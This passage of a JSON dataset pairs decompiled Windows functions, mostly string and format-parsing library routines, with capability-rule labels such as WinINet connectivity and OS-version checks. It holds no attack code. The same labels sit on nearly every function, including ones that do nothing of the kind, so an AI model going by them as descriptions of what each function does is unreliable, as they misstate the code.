0x47, 0) & 1) << 8 | (SUB161(auVar13 >> 0x4f, 0) & 1) << 9 |\n                         (SUB161(auVar13 >> 0x57, 0) & 1) << 10 | (SUB161(auVar13 >> 0x5f, 0) & 1) << 0xb |\n                         (SUB161(auVar13 >> 0x67, 0) & 1) << 0xc | (SUB161(auVar13 >> 0x6f, 0) & 1) << 0xd |\n                         (SUB161(auVar13 >> 0x77, 0) & 1) << 0xe | (uVar14 >> 7) << 0xf) & uVar3;\n                if (uVar5 != 0) break;\n                uVar3 = (SUB161(auVar11 >> 7, 0) & 1 | (SUB161(auVar11 >> 0xf, 0) & 1) << 1 |\n                         (SUB161(auVar11 >> 0x17, 0) & 1) << 2 | (SUB161(auVar11 >> 0x1f, 0) & 1) << 3 |\n                         (SUB161(auVar11 >> 0x27, 0) & 1) << 4 | (SUB161(auVar11 >> 0x2f, 0) & 1) << 5 |\n                         (SUB161(auVar11 >> 0x37, 0) & 1) << 6 | (SUB161(auVar11 >> 0x3f, 0) & 1) << 7 |\n                         (SUB161(auVar11 >> 0x47, 0) & 1) << 8 | (SUB161(auVar11 >> 0x4f, 0) & 1) << 9 |\n                         (SUB161(auVar11 >> 0x57, 0) & 1) << 10 | (SUB161(auVar11 >> 0x5f, 0) & 1) << 0xb |\n                         (SUB161(auVar11 >> 0x67, 0) & 1) << 0xc | (SUB161(auVar11 >> 0x6f, 0) & 1) << 0xd |\n                         (SUB161(auVar11 >> 0x77, 0) & 1) << 0xe | (uVar12 >> 7) << 0xf) & uVar3;\n                iVar6 = 0x1f;\n                if (uVar3 != 0) {\n                    for (; uVar3 >> iVar6 == 0; iVar6 = iVar6 + -1) {\n                    }\n                }\n                if (uVar3 != 0) {\n                    pauVar7 = pcVar8 + iVar6;\n                }\n                uVar3 = 0xffffffff;\n                pcVar8 = pcVar8 + 0x10;\n            }\n            uVar3 = (uVar5 * 2 & uVar5 * -2) - 1 &\n                    (SUB161(auVar11 >> 7, 0) & 1 | (SUB161(auVar11 >> 0xf, 0) & 1) << 1 |\n                     (SUB161(auVar11 >> 0x17, 0) & 1) << 2 | (SUB161(auVar11 >> 0x1f, 0) & 1) << 3 |\n                     (SUB161(auVar11 >> 0x27, 0) & 1) << 4 | (SUB161(auVar11 >> 0x2f, 0) & 1) << 5 |\n                     (SUB161(auVar11 >> 0x37, 0) & 1) << 6 | (SUB161(auVar11 >> 0x3f, 0) & 1) << 7 |\n                     (SUB161(auVar11 >> 0x47, 0) & 1) << 8 | (SUB161(auVar11 >> 0x4f, 0) & 1) << 9 |\n                     (SUB161(auVar11 >> 0x57, 0) & 1) << 10 | (SUB161(auVar11 >> 0x5f, 0) & 1) << 0xb |\n                     (SUB161(auVar11 >> 0x67, 0) & 1) << 0xc | (SUB161(auVar11 >> 0x6f, 0) & 1) << 0xd |\n                     (SUB161(auVar11 >> 0x77, 0) & 1) << 0xe | (uVar12 >> 7) << 0xf) & uVar3;\n            iVar6 = 0x1f;\n            if (uVar3 != 0) {\n                for (; uVar3 >> iVar6 == 0; iVar6 = iVar6 + -1) {\n                }\n            }\n            pauVar4 = pcVar8 + iVar6;\n            if (uVar3 == 0) {\n                pauVar4 = pauVar7;\n            }\n            return pauVar4;\n        }\n        uVar3 = arg_ch;\n        if (uVar3 == 0) {\n            pcVar8 = arg_8h & 0xfffffff0;\n            auVar15 = CONCAT115(-(pcVar8[0xf] == '\\0'), \n                                CONCAT114(-(pcVar8[0xe] == '\\0'), \n                                          CONCAT113(-(pcVar8[0xd] == '\\0'), \n                                                    CONCAT112(-(pcVar8[0xc] == '\\0'), \n                                                              CONCAT111(-(pcVar8[0xb] == '\\0'), \n                                                                        CONCAT110(-(pcVar8[10] == '\\0'), \n                                                                                  CONCAT19(-(pcVar8[9] == '\\0'), \n                                                                                           CONCAT18(-(pcVar8[8] == '\\0')\n                                                                                                    , CONCAT17(-(pcVar8[\n                                                            7] == '\\0'), \n                                                            CONCAT16(-(pcVar8[6] == '\\0'), \n                                                                     CONCAT15(-(pcVar8[5] == '\\0'), \n                                                                              CONCAT14(-(pcVar8[4] == '\\0'), \n                                                                                       CONCAT13(-(pcVar8[3] == '\\0'), \n                                                                                                CONCAT12(-(pcVar8[2] ==\n                                                                                                          '\\0'), \n                                                            CONCAT11(-(pcVar8[1] == '\\0'), -(*pcVar8 == '\\0'))))))))))))\n                                                            ))));\n            uVar3 = (SUB161(auVar15 >> 7, 0) & 1 | (SUB161(auVar15 >> 0xf, 0) & 1) << 1 |\n                     (SUB161(auVar15 >> 0x17, 0) & 1) << 2 | (SUB161(auVar15 >> 0x1f, 0) & 1) << 3 |\n                     (SUB161(auVar15 >> 0x27, 0) & 1) << 4 | (SUB161(auVar15 >> 0x2f, 0) & 1) << 5 |\n                     (SUB161(auVar15 >> 0x37, 0) & 1) << 6 | (SUB161(auVar15 >> 0x3f, 0) & 1) << 7 |\n                     (SUB161(auVar15 >> 0x47, 0) & 1) << 8 | (SUB161(auVar15 >> 0x4f, 0) & 1) << 9 |\n                     (SUB161(auVar15 >> 0x57, 0) & 1) << 10 | (SUB161(auVar15 >> 0x5f, 0) & 1) << 0xb |\n                     (SUB161(auVar15 >> 0x67, 0) & 1) << 0xc | (SUB161(auVar15 >> 0x6f, 0) & 1) << 0xd |\n                     (SUB161(auVar15 >> 0x77, 0) & 1) << 0xe | (-(pcVar8[0xf] == '\\0') >> 7) << 0xf) &\n                    -1 << (arg_8h & 0xf);\n            while (uVar3 == 0) {\n                pcVar1 = pcVar8 + 0x1f;\n                auVar15 = CONCAT115(-(*pcVar1 == '\\0'), \n                                    CONCAT114(-(pcVar8[0x1e] == '\\0'), \n                                              CONCAT113(-(pcVar8[0x1d] == '\\0'), \n                                                        CONCAT112(-(pcVar8[0x1c] == '\\0'), \n                                                                  CONCAT111(-(pcVar8[0x1b] == '\\0'), \n                                                                            CONCAT110(-(pcVar8[0x1a] == '\\0'), \n                                                                                      CONCAT19(-(pcVar8[0x19] == '\\0'), \n                                                                                               CONCAT18(-(pcVar8[0x18]\n                                                                                                         == '\\0'), \n                                                                                                        CONCAT17(-(\n                                                            pcVar8[0x17] == '\\0'), \n                                                            CONCAT16(-(pcVar8[0x16] == '\\0'), \n                                                                     CONCAT15(-(pcVar8[0x15] == '\\0'), \n                                                                              CONCAT14(-(pcVar8[0x14] == '\\0'), \n                                                                                       CONCAT13(-(pcVar8[0x13] == '\\0')\n                                                                                                , CONCAT12(-(pcVar8[0x12\n                                                            ] == '\\0'), \n                                                            CONCAT11(-(pcVar8[0x11] == '\\0'), -(pcVar8[0x10] == '\\0'))))\n                                                            ))))))))))));\n                pcVar8 = pcVar8 + 0x10;\n                uVar3 = SUB161(auVar15 >> 7, 0) & 1 | (SUB161(auVar15 >> 0xf, 0) & 1) << 1 |\n                        (SUB161(auVar15 >> 0x17, 0) & 1) << 2 | (SUB161(auVar15 >> 0x1f, 0) & 1) << 3 |\n                        (SUB161(auVar15 >> 0x27, 0) & 1) << 4 | (SUB161(auVar15 >> 0x2f, 0) & 1) << 5 |\n                        (SUB161(auVar15 >> 0x37, 0) & 1) << 6 | (SUB161(auVar15 >> 0x3f, 0) & 1) << 7 |\n                        (SUB161(auVar15 >> 0x47, 0) & 1) << 8 | (SUB161(auVar15 >> 0x4f, 0) & 1) << 9 |\n                        (SUB161(auVar15 >> 0x57, 0) & 1) << 10 | (SUB161(auVar15 >> 0x5f, 0) & 1) << 0xb |\n                        (SUB161(auVar15 >> 0x67, 0) & 1) << 0xc | (SUB161(auVar15 >> 0x6f, 0) & 1) << 0xd |\n                        (SUB161(auVar15 >> 0x77, 0) & 1) << 0xe | (-(*pcVar1 == '\\0') >> 7) << 0xf;\n            }\n            iVar6 = 0;\n            if (uVar3 != 0) {\n                for (; (uVar3 >> iVar6 & 1) == 0; iVar6 = iVar6 + 1) {\n                }\n            }\n            pauVar7 = pcVar8 + iVar6;\n        }\n        else {\n            pauVar7 = NULL;\n            uVar5 = arg_8h & 0xf;\n            while (uVar5 != 0) {\n                if ((*arg_8h)[0] == uVar3) {\n                    pauVar7 = arg_8h;\n                }\n                if ((*arg_8h)[0] == 0) {\n                    return pauVar7;\n                }\n                arg_8h = *arg_8h + 1;\n                uVar5 = arg_8h & 0xf;\n            }\n            do {\n                pauVar4 = arg_8h[1];\n                iVar6 = pcmpistri(ZEXT416(uVar3), *arg_8h, 0x40);\n                if (0xffffffef < arg_8h) {\n                    pauVar7 = pauVar4[-1] + iVar6;\n                }\n                arg_8h = pauVar4;\n            } while (pauVar4 != NULL);\n        }\n        return pauVar7;\n    }\n    iVar6 = -1;\n    do {\n        pauVar7 = arg_8h;\n        if (iVar6 == 0) break;\n        iVar6 = iVar6 + -1;\n        pauVar7 = *arg_8h + 1;\n        puVar2 = *arg_8h;\n        arg_8h = pauVar7;\n    } while (*puVar2 != '\\0');\n    iVar6 = -(iVar6 + 1);\n    puVar10 = pauVar7[-1] + 0xf;\n    do {\n        puVar9 = puVar10;\n        if (iVar6 == 0) break;\n        iVar6 = iVar6 + -1;\n        puVar9 = puVar10 + -1;\n        uVar12 = *puVar10;\n        puVar10 = puVar9;\n    } while (arg_ch != uVar12);\n    pauVar7 = puVar9 + 1;\n    if ((*pauVar7)[0] != arg_ch) {\n        pauVar7 = NULL;\n    }\n    return pauVar7;\n}\n",
        "token_count": 4344
    },
    "00401bd1": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00401bd1(uint *arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    uint uVar3;\n    int32_t *piVar4;\n    int32_t in_ECX;\n    uint32_t var_4h;\n    \n    piVar2 = *(in_ECX + 0xc);\n    if (piVar2 == NULL) {\n        piVar2 = fcn.004039a4();\n        *(in_ECX + 0xc) = piVar2;\n    }\n    iVar1 = *piVar2;\n    *piVar2 = 0;\n    var_4h = 0;\n    uVar3 = fcn.00403607(*(in_ECX + 0x10) + -2, &var_4h, 10);\n    *arg_8h = uVar3;\n    piVar4 = *(in_ECX + 0xc);\n    if (piVar4 == NULL) {\n        piVar4 = fcn.004039a4();\n        *(in_ECX + 0xc) = piVar4;\n    }\n    if ((*piVar4 == 0x22) || (var_4h < *(in_ECX + 0x10))) {\n        uVar3 = 0;\n    }\n    else {\n        *(in_ECX + 0x10) = var_4h;\n        uVar3 = 1;\n    }\n    if ((*piVar2 == 0) && (iVar1 != 0)) {\n        *piVar2 = iVar1;\n    }\n    return uVar3;\n}\n",
        "token_count": 355
    },
    "00401be5": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00401be5(int32_t *arg_8h)\n\n{\n    char cVar1;\n    uint *puVar2;\n    uint32_t uVar3;\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x45c) == 1) {\n        *(in_ECX + 0x14) = *(in_ECX + 0x14) + 4;\n        cVar1 = *(*(in_ECX + 0x14) + -4);\n    }\n    else {\n        uVar3 = *(in_ECX + 0xaa8);\n        if (99 < uVar3) {\n            puVar2 = fcn.004039a4();\n            *puVar2 = 0x16;\n            uVar3 = fcn.00403751();\n            return uVar3 & 0xffffff00;\n        }\n        if (*(in_ECX + 0x458) == 1) {\n            uVar3 = fcn.00401190(in_ECX + 0x464 + uVar3 * 0x10, 1, *(in_ECX + 0x31), *(in_ECX + 0x2c));\n            return uVar3;\n        }\n        cVar1 = **(in_ECX + 0x46c + uVar3 * 0x10);\n    }\n    *arg_8h = cVar1;\n    arg_8h[1] = cVar1 >> 0x1f;\n    return CONCAT31(cVar1 >> 7, 1);\n}\n",
        "token_count": 347
    },
    "00401bea": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00401bea(uint *arg_8h)\n\n{\n    uint32_t uVar1;\n    uint *puVar2;\n    uint uVar3;\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x45c) == 1) {\n        *(in_ECX + 0x14) = *(in_ECX + 0x14) + 4;\n        *arg_8h = *(*(in_ECX + 0x14) + -4);\n    }\n    else {\n        uVar1 = *(in_ECX + 0xaa8);\n        if (99 < uVar1) {\n            puVar2 = fcn.004039a4();\n            *puVar2 = 0x16;\n            fcn.00403751();\n            return 0;\n        }\n        if (*(in_ECX + 0x458) == 1) {\n            uVar3 = fcn.00401190(in_ECX + 0x464 + uVar1 * 0x10, 3, *(in_ECX + 0x31), *(in_ECX + 0x2c));\n            return uVar3;\n        }\n        *arg_8h = **(in_ECX + 0x46c + uVar1 * 0x10);\n    }\n    return 1;\n}\n",
        "token_count": 298
    },
    "00401c08": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00401c08(int32_t param_1)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint *puVar4;\n    char *var_4h;\n    \n    if (*(param_1 + 0x45c) == 1) {\n        *(param_1 + 0x14) = *(param_1 + 0x14) + 4;\n        *(param_1 + 0x28) = *(*(param_1 + 0x14) + -4);\n    }\n    else {\n        var_4h = NULL;\n        iVar1 = fcn.004048e5(*(param_1 + 0x10), &var_4h, 10);\n        iVar1 = iVar1 + -1;\n        *(param_1 + 0x10) = var_4h + 1;\n        if (*(param_1 + 0x458) == 1) {\n            if (((-1 < iVar1) && (*var_4h == '$')) && (iVar1 < 100)) {\n                iVar2 = *(param_1 + 0xaa4);\n                if (*(param_1 + 0xaa4) < iVar1) {\n                    iVar2 = iVar1;\n                }\n                *(param_1 + 0xaa4) = iVar2;\n                uVar3 = fcn.0040288d(param_1 + 0x464 + iVar1 * 0x10, 1, *(param_1 + 0x31), *(param_1 + 0x2c));\n                return uVar3;\n            }\n            puVar4 = fcn.004039a4();\n            *puVar4 = 0x16;\n            fcn.00403751();\n            return 0;\n        }\n        *(param_1 + 0x28) = **(param_1 + 0x46c + iVar1 * 0x10);\n    }\n    return 1;\n}\n",
        "token_count": 438
    },
    "00401c0d": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl\nfcn.00401c0d(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint noname_4, uint arg_1ch, uint arg_20h, \n            uint arg_24h)\n\n{\n    int32_t iVar1;\n    uint32_t *puVar2;\n    uint *puVar3;\n    char cVar4;\n    uint uVar5;\n    uint noname_0;\n    int32_t unaff_EBP;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_4h;\n    \n    fcn.0040536c(0x38);\n    iVar1 = *(unaff_EBP + 0x1c);\n    puVar2 = *(unaff_EBP + 0x20);\n    *(unaff_EBP + -0x44) = *(unaff_EBP + 8);\n    uVar5 = *(iVar1 + 0x30);\n    *(unaff_EBP + -0x34) = *(unaff_EBP + 0x24);\n    fcn.0040327e(uVar5);\n    *(unaff_EBP + -4) = 0;\n    uVar5 = fcn.00404232(noname_0, unaff_EBP + -0x30, unaff_EBP + 0xc, unaff_EBP + 0x14, *(iVar1 + 0x14), \n                         unaff_EBP + -0x3c);\n    *(unaff_EBP + -4) = 0xffffffff;\n    fcn.004050a6();\n    if (*(unaff_EBP + -0x30) == '\\0') {\n        puVar3 = *(unaff_EBP + -0x34);\n        *puVar2 = 2;\n        *puVar3 = 0;\n    }\n    else {\n        uVar5 = fcn.00404214(unaff_EBP + -0x30, unaff_EBP + -0x40, uVar5, unaff_EBP + -0x38);\n        **(unaff_EBP + -0x34) = uVar5;\n        if ((*(unaff_EBP + -0x40) == unaff_EBP + -0x30) || (*(unaff_EBP + -0x38) != 0)) {\n            *puVar2 = 2;\n        }\n    }\n    cVar4 = fcn.0040640b(unaff_EBP + 0x14);\n    if (cVar4 != '\\0') {\n        *puVar2 = *puVar2 | 1;\n    }\n    puVar3 = *(unaff_EBP + -0x44);\n    uVar5 = *(unaff_EBP + 0x10);\n    *puVar3 = *(unaff_EBP + 0xc);\n    puVar3[1] = uVar5;\n    fcn.004067d0();\n    return;\n}\n",
        "token_count": 697
    },
    "00401cb2": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00401cb2(int32_t param_1)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint *puVar4;\n    char *var_4h;\n    \n    if (*(param_1 + 0x45c) == 1) {\n        *(param_1 + 0x14) = *(param_1 + 0x14) + 4;\n        *(param_1 + 0x24) = *(*(param_1 + 0x14) + -4);\n    }\n    else {\n        var_4h = NULL;\n        iVar1 = fcn.004048e5(*(param_1 + 0x10), &var_4h, 10);\n        iVar1 = iVar1 + -1;\n        *(param_1 + 0x10) = var_4h + 1;\n        if (*(param_1 + 0x458) == 1) {\n            if (((-1 < iVar1) && (*var_4h == '$')) && (iVar1 < 100)) {\n                iVar2 = *(param_1 + 0xaa4);\n                if (*(param_1 + 0xaa4) < iVar1) {\n                    iVar2 = iVar1;\n                }\n                *(param_1 + 0xaa4) = iVar2;\n                uVar3 = fcn.00401190(param_1 + 0x464 + iVar1 * 0x10, 1, *(param_1 + 0x31), *(param_1 + 0x2c));\n                return uVar3;\n            }\n            puVar4 = fcn.004039a4();\n            *puVar4 = 0x16;\n            fcn.00403751();\n            return 0;\n        }\n        *(param_1 + 0x24) = **(param_1 + 0x46c + iVar1 * 0x10);\n    }\n    return 1;\n}\n",
        "token_count": 437
    },
    "00401ce4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuchar __fastcall fcn.00401ce4(int32_t param_1)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    char cVar3;\n    uint *puVar4;\n    int32_t iVar5;\n    int32_t *piVar6;\n    bool bVar7;\n    \n    cVar3 = fcn.00404a70();\n    if (cVar3 == '\\0') {\n        return 0;\n    }\n    if ((*(param_1 + 0x45c) == 2) && (*(param_1 + 0x458) == 1)) {\n        iVar1 = *(param_1 + 0xaa4);\n        if (param_1 != param_1 + (iVar1 * 4 + 4) * 4) {\n            iVar5 = *(param_1 + 0x14);\n            piVar6 = param_1 + 0x464;\n            do {\n                iVar2 = *piVar6;\n                piVar6[2] = iVar5;\n                if (iVar2 == 1) {\ncode_r0x004a68f4:\n                    *(param_1 + 0x14) = *(param_1 + 0x14) + 4;\n                }\n                else {\n                    if (iVar2 != 2) {\n                        if (iVar2 == 3) goto code_r0x004a68f4;\n                        if (iVar2 != 4) {\n                            puVar4 = fcn.004039a4();\n                            *puVar4 = 0x16;\n                            fcn.00403751();\n                            return 0;\n                        }\n                    }\n                    *(param_1 + 0x14) = *(param_1 + 0x14) + 8;\n                }\n                iVar5 = *(param_1 + 0x14);\n                bVar7 = piVar6 != param_1 + (iVar1 * 4 + 0x119) * 4;\n                piVar6 = piVar6 + 4;\n            } while (bVar7);\n        }\n    }\n    return 1;\n}\n",
        "token_count": 458
    },
    "00401ce9": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl\nfcn.00401ce9(uint *arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint noname_4, uint arg_1ch, uint32_t *arg_20h, \n            double *arg_24h)\n\n{\n    uint32_t *puVar1;\n    double *pdVar2;\n    char cVar3;\n    uint arg_10h_00;\n    uint in_ECX;\n    uint unaff_EBX;\n    float10 fVar4;\n    int32_t var_328h;\n    uint *var_324h;\n    int32_t var_320h;\n    uint var_31ch;\n    uint32_t var_4h;\n    \n    pdVar2 = arg_24h;\n    puVar1 = arg_20h;\n    var_4h = *0x56cca8 ^ &stack0xfffffffc;\n    var_320h = 1000000000;\n    arg_10h_00 = fcn.004055dd(in_ECX, &var_31ch, &arg_ch, &arg_14h, arg_1ch, &var_320h);\n    if (var_31ch == '\\0') {\ncode_r0x00477f21:\n        fVar4 = 0;\n        *puVar1 = 2;\n    }\n    else {\n        fVar4 = fcn.00405ef7(&var_31ch, &var_324h, arg_10h_00, &var_328h);\n        *pdVar2 = fVar4;\n        if ((var_324h == &var_31ch) || (var_328h != 0)) goto code_r0x00477f21;\n        if ((var_320h == 1000000000) || (var_320h == 0)) goto code_r0x00477f2d;\n        fVar4 = fcn.00402bad(SUB84(fVar4, 0), fVar4 >> 0x20, var_320h << 2);\n    }\n    *pdVar2 = fVar4;\ncode_r0x00477f2d:\n    cVar3 = fcn.00401a9b(&arg_14h);\n    if (cVar3 != '\\0') {\n        *puVar1 = *puVar1 | 1;\n    }\n    *arg_8h = arg_ch;\n    arg_8h[1] = arg_10h;\n    fcn.00403085(unaff_EBX);\n    return;\n}\n",
        "token_count": 570
    },
    "00401d0c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00401d0c(uint16_t *arg_8h, uint16_t *arg_ch, int32_t arg_10h)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    \n    if (*0x57004c != 0) {\n        iVar2 = fcn.00405eb1(arg_8h, arg_ch, arg_10h, 0);\n        return iVar2;\n    }\n    if ((arg_8h != NULL) && (arg_ch != NULL)) {\n        if (arg_10h != 0) {\n            do {\n                uVar3 = *arg_8h;\n                if (uVar3 - 0x41 < 0x1a) {\n                    uVar3 = uVar3 + 0x20;\n                }\n                uVar4 = *arg_ch;\n                arg_8h = arg_8h + 1;\n                if (uVar4 - 0x41 < 0x1a) {\n                    uVar4 = uVar4 + 0x20;\n                }\n                arg_ch = arg_ch + 1;\n            } while (((uVar3 - uVar4 == 0) && (uVar3 != 0)) && (arg_10h = arg_10h + -1,  arg_10h != 0));\n            return uVar3 - uVar4;\n        }\n        return 0;\n    }\n    puVar1 = fcn.004039a4();\n    *puVar1 = 0x16;\n    fcn.00403751();\n    return 0x7fffffff;\n}\n",
        "token_count": 372
    },
    "00401d20": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00401d20(uint arg_8h)\n\n{\n    char cVar1;\n    uint uVar2;\n    char *pcVar3;\n    uint *puVar4;\n    int32_t iVar5;\n    int32_t *piVar6;\n    uint32_t uVar7;\n    int32_t unaff_EBP;\n    uint32_t uVar8;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_4h;\n    uint arg_ch;\n    \n    arg_ch = 0x28;\n    fcn.004030e9();\n    uVar7 = *0x56f460;\n    *0x56f470 = *0x56f470 + 1;\n    *(unaff_EBP + -4) = 0;\n    if ((uVar7 & 0x2000) == 0) {\n        if (**0x56f458 != '?') {\n            if (**0x56f458 == '\\0') {\n                fcn.004017df(1);\n            }\n            else {\n                puVar4 = *(unaff_EBP + 8);\n                puVar4[1] = 0;\n                *(puVar4 + 1) = 2;\n                *puVar4 = 0;\n            }\n            goto code_r0x0048cf2f;\n        }\n        pcVar3 = *0x56f458 + 1;\n        if ((*pcVar3 != '?') || ((*0x56f458)[2] != '?')) {\n            *0x56f458 = pcVar3;\n            fcn.00401474(unaff_EBP + -0x18);\n            iVar5 = *(unaff_EBP + -0x18);\n            uVar7 = *(unaff_EBP + -0x14);\n            if ((iVar5 == 0) || ((uVar7 & 0x200) == 0)) {\n                *(unaff_EBP + -0x10) = 0;\n            }\n            else {\n                *(unaff_EBP + -0x10) = 1;\n            }\n            uVar8 = uVar7 >> 0xf;\n            if (uVar7 < '\\x02') {\n                if ((**0x56f458 != '\\0') && (**0x56f458 != '@')) {\n                    fcn.004039f4(unaff_EBP + -0x28);\n                    if (*(unaff_EBP + -0x28) != 0) {\n                        if (*0x56f464 == '\\0') {\n                            *(unaff_EBP + -0x20) = *(unaff_EBP + -0x28);\n                            *(unaff_EBP + -0x1c) = *(unaff_EBP + -0x24);\n                            *(unaff_EBP + -0x30) = 0x54f380;\n                            *(unaff_EBP + -0x2c) = 2;\n                            fcn.00405c95(unaff_EBP + -0x30);\n                            iVar5 = unaff_EBP + -0x28;\n                        }\n                        else {\n                            *0x56f464 = '\\0';\n                            *(unaff_EBP + -0x20) = iVar5;\n                            *(unaff_EBP + -0x1c) = uVar7;\n                            fcn.00402eb9(unaff_EBP + -0x28);\n                            pcVar3 = *0x56f458;\n                            iVar5 = *(unaff_EBP + -0x20);\n                            uVar7 = *(unaff_EBP + -0x1c);\n                            *(unaff_EBP + -0x18) = iVar5;\n                            cVar1 = *pcVar3;\n                            *(unaff_EBP + -0x14) = uVar7;\n                            if (cVar1 == '@') goto code_r0x0048ce7a;\n                            puVar4 = fcn.004039f4(unaff_EBP + -0x30);\n                            *(unaff_EBP + -0x28) = 0x54f380;\n                            *(unaff_EBP + -0x24) = 2;\n                            uVar2 = *puVar4;\n                            *(unaff_EBP + -0x1c) = puVar4[1];\n                            *(unaff_EBP + -0x20) = uVar2;\n                            fcn.00405c95(unaff_EBP + -0x28);\n                            iVar5 = unaff_EBP + -0x30;\n                        }\n                        piVar6 = fcn.004052f9(iVar5, arg_ch);\n                        uVar7 = piVar6[1];\n                        iVar5 = *piVar6;\n                        *(unaff_EBP + -0x14) = uVar7;\n                        *(unaff_EBP + -0x18) = iVar5;\n                    }\n                }\ncode_r0x0048ce7a:\n                if ((*(unaff_EBP + -0x10) != 0) && (iVar5 != 0)) {\n                    uVar7 = uVar7 | 0x200;\n                    *(unaff_EBP + -0x14) = uVar7;\n                }\n                if ((uVar8 & 1) != 0) {\n                    uVar7 = uVar7 | 0x8000;\n                    *(unaff_EBP + -0x14) = uVar7;\n                }\n                if ((iVar5 != 0) && ((uVar7 & 0x1000) == 0)) {\n                    if (**0x56f458 != '\\0') {\n                        if (**0x56f458 != '@') {\n                            puVar4 = *(unaff_EBP + 8);\n                            puVar4[1] = 0;\n                            *puVar4 = 0;\n                            *(puVar4 + 1) = 2;\n                            goto code_r0x0048cf2f;\n                        }\n                        *0x56f458 = *0x56f458 + 1;\n                    }\n                    if ((((*0x56f460 & 0x1000) == 0) || (*(unaff_EBP + -0x10) != 0)) || ((uVar7 & 0x8000) != 0)) {\n                        fcn.00403152(*(unaff_EBP + 8), unaff_EBP + -0x18);\n                        goto code_r0x0048cf2f;\n                    }\n                    *(unaff_EBP + -0x30) = 0;\n                    *(unaff_EBP + -0x2c) = 0;\n                    fcn.00403152(unaff_EBP + -0x28, unaff_EBP + -0x30);\n                }\n            }\n            piVar6 = *(unaff_EBP + 8);\n            *piVar6 = iVar5;\n            piVar6[1] = uVar7;\n            goto code_r0x0048cf2f;\n        }\n        *0x56f458 = pcVar3;\n        fcn.00401d20(unaff_EBP + -0x28);\n        for (; **0x56f458 != '\\0'; *0x56f458 = *0x56f458 + 1) {\n        }\n    }\n    else {\n        *0x56f460 = uVar7 & 0xffffdfff;\n        fcn.00404bf6(unaff_EBP + -0x28, 0);\n        *0x56f460 = *0x56f460 | 0x2000;\n    }\n    puVar4 = *(unaff_EBP + 8);\n    *puVar4 = *(unaff_EBP + -0x28);\n    puVar4[1] = *(unaff_EBP + -0x24);\ncode_r0x0048cf2f:\n    *0x56f470 = *0x56f470 + -1;\n    fcn.0040113b();\n    return;\n}\n",
        "token_count": 1806
    },
    "00418160": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
